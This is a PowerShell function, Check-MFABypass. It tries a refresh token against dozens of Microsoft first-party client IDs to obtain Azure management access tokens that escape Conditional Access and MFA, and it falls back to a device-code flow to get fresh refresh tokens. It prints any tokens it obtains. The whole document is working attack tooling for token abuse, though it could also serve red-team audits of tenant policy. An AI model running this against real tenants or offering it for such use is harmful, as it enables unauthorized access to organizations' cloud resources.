function Check-MFABypass {
    param (
        [Parameter(Mandatory = $true)][string]$TenantID,
        [Parameter(Mandatory = $true)][string]$RefreshToken
    )

    $ClientIDs = @{
        "00b41c95-dab0-4487-9791-b9d2c32c80f2" = "Office 365 Management"
        "04b07795-8ddb-461a-bbee-02f9e1bf7b46" = "Microsoft Azure CLI"
        "0ec893e0-5785-4de6-99da-4ed124e5296c" = "Office UWP PWA"
        "18fbca16-2224-45f6-85b0-f7bf2b39b3f3" = "Microsoft Docs"
        "1950a258-227b-4e31-a9cf-717495945fc2" = "Microsoft Azure PowerShell"
        "1b3c667f-cde3-4090-b60b-3d2abd0117f0" = "Windows Spotlight"
        "1b730954-1685-4b74-9bfd-dac224a7b894" = "Azure Active Directory PowerShell"
        "1fec8e78-bce4-4aaf-ab1b-5451cc387264" = "Microsoft Teams"
        "22098786-6e16-43cc-a27d-191a01a1e3b5" = "Microsoft To-Do client"
        "268761a2-03f3-40df-8a8b-c3db24145b6b" = "Universal Store Native Client"
        "26a7ee05-5602-4d76-a7ba-eae8b7b67941" = "Windows Search"
        "27922004-5251-4030-b22d-91ecd9a37ea4" = "Outlook Mobile"
        "29d9ed98-a469-4536-ade2-f981bc1d605e" = "Microsoft Authentication Broker"
        "2d7f3606-b07d-41d1-b9d2-0d0c9296a6e8" = "Microsoft Bing Search for Microsoft Edge"
        "4813382a-8fa7-425e-ab75-3b753aab3abb" = "Microsoft Authenticator App"
        "4e291c71-d680-4d0e-9640-0a3358e31177" = "PowerApps"
        "57336123-6e14-4acc-8dcf-287b6088aa28" = "Microsoft Whiteboard Client"
        "57fcbcfa-7cee-4eb1-8b25-12d2030b4ee0" = "Microsoft Flow Mobile PROD-GCCH-CN"
        "60c8bde5-3167-4f92-8fdb-059f6176dc0f" = "Enterprise Roaming and Backup"
        "66375f6b-983f-4c2c-9701-d680650f588f" = "Microsoft Planner"
        "844cca35-0656-46ce-b636-13f48b0eecbd" = "Microsoft Stream Mobile Native"
        "872cd9fa-d31f-45e0-9eab-6e460a02d1f1" = "Visual Studio - Legacy"
        "87749df4-7ccf-48f8-aa87-704bad0e0e16" = "Microsoft Teams - Device Admin Agent"
        "90f610bf-206d-4950-b61d-37fa6fd1b224" = "Aadrm Admin PowerShell"
        "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223" = "Microsfot Intune Company Portal"
        "9bc3ab49-b65d-410a-85ad-de819febfddc" = "Microsoft SharePoint Online Management Shell"
        "a0c73c16-a7e3-4564-9a95-2bdf47383716" = "Microsoft Exchange Online Remote PowerShell"
        "a40d7d7d-59aa-447e-a655-679a4107e548" = "Accounts Control UI"
        "a569458c-7f2b-45cb-bab9-b7dee514d112" = "Yammer iPhone"
        "ab9b8c07-8f02-4f72-87fa-80105867a763" = "OneDrive Sync Engine"
        "af124e86-4e96-495a-b70a-90f90ab96707" = "OneDrive iOS App"
        "b26aadf8-566f-4478-926f-589f601d9c74" = "OneDrive"
        "b90d5b8f-5503-4153-b545-b31cecfaece2" = "AADJ CSP"
        "c0d2a505-13b8-4ae0-aa9e-cddd5eab0b12" = "Microsoft Power BI"
        "c58637bb-e2e1-4312-8a00-04b5ffcd3403" = "SharePoint Online Client Extensibility"
        "cb1056e2-e479-49de-ae31-7812af012ed8" = "Microsoft Azure Active Directory Connect"
        "cf36b471-5b44-428c-9ce7-313bf84528de" = "Microsoft Bing Search"
        "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0" = "SharePoint"
        "d3590ed6-52b3-4102-aeff-aad2292ab01c" = "Microsoft Office"
        "e9b154d0-7658-433b-bb25-6b8e0a8a7c59" = "Outlook Lite"
        "e9c51622-460d-4d3d-952d-966a5b1da34c" = "Microsoft Edge"
        "eb539595-3fe1-474e-9c1d-feb3625d1be5" = "Microsoft Tunnel"
        "ecd6b820-32c2-49b6-98a6-444530e5a77a" = "Microsoft Edge"
        "f05ff7c9-f75a-4acd-a3b5-f4b6a870245d" = "SharePoint Android"
        "f448d7e5-e313-4f90-a3eb-5dbb3277e4b3" = "Media Recording for Dynamics 365 Sales"
        "f44b1140-bc5e-48c6-8dc0-5cf5a53c0e34" = "Microsoft Edge"
        "fb78d390-0c51-40cd-8e17-fdbfab77341b" = "Microsoft Exchange REST API Based PowerShell"
        "fc0f3af4-6835-4174-b806-f7db311fd2f3" = "Microsoft Intune Windows Agent"
    }

        foreach ($ClientID in $ClientIDs.Keys) {
        Write-Host "`n[*] Trying Client ID: $ClientID ($($ClientIDs[$ClientID]))..." -ForegroundColor Cyan

        $url = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/token"
        $body = @{
            client_id     = $ClientID
            scope         = "https://management.azure.com/.default"
            grant_type    = "refresh_token"
            refresh_token = $RefreshToken
        }

        try {
            $response = Invoke-RestMethod -Method POST -Uri $url -Body $body -ContentType "application/x-www-form-urlencoded" -ErrorAction Stop

            if ($response.access_token) {
                Write-Host "`n[+] SUCCESS: Access Token for Client ID: $ClientID ($($ClientIDs[$ClientID]))" -ForegroundColor Green
                Write-Host "`nAccess Token:`n$response.access_token" -ForegroundColor Yellow
            } else {
                Write-Host "[-] No access token received for Client ID: $ClientID" -ForegroundColor DarkYellow
            }

        } catch {
            $errorMessage = $_.ErrorDetails.Message | ConvertFrom-Json

            if ($errorMessage.error_description -match "AADSTS53003") {
                Write-Host "[!] Blocked by Conditional Access – Client ID: $ClientID ($($ClientIDs[$ClientID]))" -ForegroundColor Red
            }
            elseif ($errorMessage.error_description -match "AADSTS70000") {
                Write-Host "[!] Invalid or Malformed Grant – Refresh token likely not valid for Client ID: $ClientID ($($ClientIDs[$ClientID]))" -ForegroundColor DarkYellow

                
                Write-Host "[*] Attempting to request new Refresh Token with Client ID: $ClientID..." -ForegroundColor Magenta

                $deviceCodeUrl = "https://login.microsoftonline.com/$TenantID/oauth2/v2.0/devicecode"
                $deviceBody = @{
                    client_id = $ClientID
                    scope     = "offline_access https://management.azure.com/.default"
                }

                try {
                    $deviceResponse = Invoke-RestMethod -Method POST -Uri $deviceCodeUrl -Body $deviceBody
                    Write-Host "[>] Open browser and enter code:" -ForegroundColor DarkCyan -NoNewline
                    Write-Host " $($deviceResponse.user_code)" -ForegroundColor DarkYellow
                    Start-Process $deviceResponse.verification_uri

                    $pollBody = @{
                        grant_type = "urn:ietf:params:oauth:grant-type:device_code"
                        client_id  = $ClientID
                        device_code = $deviceResponse.device_code
                    }

                    while ($true) {
                        try {
                            $pollResponse = Invoke-RestMethod -Method POST -Uri $url -Body $pollBody -ContentType "application/x-www-form-urlencoded" -ErrorAction Stop
                            Write-Host "[+] Success! New Refresh Token granted with Client ID: $ClientID" -ForegroundColor Green

								Write-Host "`nAccess Token:`n$($pollResponse.access_token)" -ForegroundColor Yellow
								Write-Host "`nRefresh Token:`n$($pollResponse.refresh_token)" -ForegroundColor Cyan

								break

                        } catch {
                            $inner = $_.ErrorDetails.Message | ConvertFrom-Json
                            if ($inner.error -eq "authorization_pending") {
                                Start-Sleep -Seconds 5
                            } else {
                                Write-Host "[-] Failed to get new refresh token: $($inner.error_description)" -ForegroundColor Red
                                break
                            }
                        }
                    }

                } catch {
                    Write-Host "[-] Device Code flow failed for Client ID: $ClientID – $($_.Exception.Message)" -ForegroundColor Red
                }

            } else {
                Write-Host "[-] Unhandled error for Client ID: $ClientID – $($errorMessage.error_description)" -ForegroundColor Red
            }
        }

        Start-Sleep -Milliseconds 500
    }
}
